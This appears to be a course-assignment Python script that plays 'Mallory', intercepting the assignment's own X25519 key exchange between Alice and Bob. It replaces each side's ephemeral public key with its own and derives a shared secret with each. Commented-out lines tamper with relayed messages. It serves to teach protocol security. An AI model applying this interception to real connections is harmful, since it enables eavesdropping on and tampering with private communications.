from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives import serialization
from Load_keys import * 

from transport import accept_peer, send_message, receive_message, connect_to_peer
import sys
import json
import hashlib

isAuthEnabled = True
MALLORY_PORT = 5005
BOB_PORT = 5000
PROTOCOL_ID = "CS6530-A2-v1"
ALICE_ID = "CS26D400"
BOB_ID = "CS26M016"

# print(len(PROTOCOL_ID.encode()), len(ALICE_ID.encode()), len(BOB_ID.encode()))

def InterceptHandshake(isAuthEnabled, sockAlice, sockBob):
    # Ephermeral private and public keys for Bob-Mallory
    bobMalloryEphPrivateKey = X25519PrivateKey.generate()
    bobMalloryEphPublicKey = bobMalloryEphPrivateKey.public_key()
    bobMalloryEphemeralPK = bobMalloryEphPublicKey.public_bytes(encoding=serialization.Encoding.Raw,
                                                                format=serialization.PublicFormat.Raw)

    # Ephermeral private and public keys for Alice-Mallory
    aliceMalloryEphPrivateKey = X25519PrivateKey.generate()
    aliceMalloryEphPublicKey = aliceMalloryEphPrivateKey.public_key()
    aliceMalloryEphemeralPK = aliceMalloryEphPublicKey.public_bytes(encoding=serialization.Encoding.Raw,
                                                            format=serialization.PublicFormat.Raw)

    # Modify and pass on M1
    message = receive_message(sockAlice)
    print("LOG: M1 received")

    M1Json = message.decode()
    M1 = json.loads(M1Json)
    aliceEphemeralPK = M1["Alice_Ephemeral_PK"]
    M1["Alice_Ephemeral_PK"] = aliceMalloryEphemeralPK.hex()
    M1Json = json.dumps(M1)
    send_message(sockBob, M1Json.encode())     # Send M1
    print("LOG: Modfied M1 send")

    # Pass on M2
    message = receive_message(sockBob)
    print("LOG: M2 received")

    M2Json = message.decode()
    M2 = json.loads(M2Json)
    bobEphemeralPK = M2["Bob_Ephemeral_PK"]
    M2["Bob_Ephemeral_PK"] = bobMalloryEphemeralPK.hex()
    M2Json = json.dumps(M2)
    send_message(sockAlice, M2Json.encode())     # Send M2
    print("LOG: Modified M2 send")

    if (isAuthEnabled):
        # Pass on M3
        M3 = receive_message(sockAlice)
        print("LOG: M3 received")
        send_message(sockBob, M3)
        print("LOG: M3 send")

        # Pass on M4
        M4 = receive_message(sockBob)
        print("LOG: M4 received")
        send_message(sockAlice, M4)
        print("LOG: M4 send")

    # Construct transcript
    # Transcript = Protocol_ID || Alice_ID || Bob_ID || Alice_SID || Bob_SID || Alice_Ephemeral_PK || Bob_Ephemeral_PK 
    transcript = (
        PROTOCOL_ID.encode() + 
        ALICE_ID.encode() + 
        BOB_ID.encode() +
        bytes.fromhex(M1["Alice_SID"]) +
        bytes.fromhex(M2["Bob_SID"]) +
        aliceMalloryEphemeralPK +
        bobMalloryEphemeralPK
    )

    # Hash the transcript
    transcriptHash = hashlib.sha256(transcript).digest()
    # Compute shared secrets
    sharedSecretAliceMallory = ComputeSharedSecret(bobMalloryEphPrivateKey, bytes.fromhex(aliceEphemeralPK))
    sharedSecretBobMallory = ComputeSharedSecret(aliceMalloryEphPrivateKey, bytes.fromhex(bobEphemeralPK))
    print("Shared Secret with Alice:", sharedSecretAliceMallory) # Debug line
    print("Shared Secret with Bob:", sharedSecretBobMallory) # Debug line
    return

if len(sys.argv) not in (3, 4):
    print("Usage: python Mallory.py <Alice-IP> <Bob-IP> [--disable-ed-auth]")
    raise SystemExit(1)

AliceIP = sys.argv[1]
BobIP = sys.argv[2]

if len(sys.argv) == 4:
    if sys.argv[3] == "--disable-ed-auth":
        isAuthEnabled = False
    else:
        print("Usage: python Mallory.py <Alice-IP> <Bob-IP> [--disable-ed-auth]")
        raise SystemExit(1)

print(f"LOG: Mallory ready to intercept on TCP port {MALLORY_PORT}...")

sockAlice, peerAlice = accept_peer(MALLORY_PORT)
print("LOG: Mallory connected to Alice")
sockBob = connect_to_peer(BobIP, BOB_PORT)
print("LOG: Mallory connected to Bob")

if (isAuthEnabled):
    try:
        InterceptHandshake(isAuthEnabled=True, sockAlice=sockAlice, sockBob=sockBob)
    except Exception:
        print("Intercept Failure")
else:
    try:
        InterceptHandshake(isAuthEnabled=False, sockAlice=sockAlice, sockBob=sockBob)
    except Exception:
        print("Intercept Failure")
# message = receive_message(sockAlice)
# print("MSG: ", message.decode())

# message = message + b"89"

# send_message(sockBob, message)
# print("LOG: Message Modified and passed on")

# Bob -> Mallory -> Alice
# message = receive_message(sockBob)
# print("MSG: ", message.decode())

# message = message + b"00"
# print("Message Modified and passed on")

# send_message(sockAlice, message)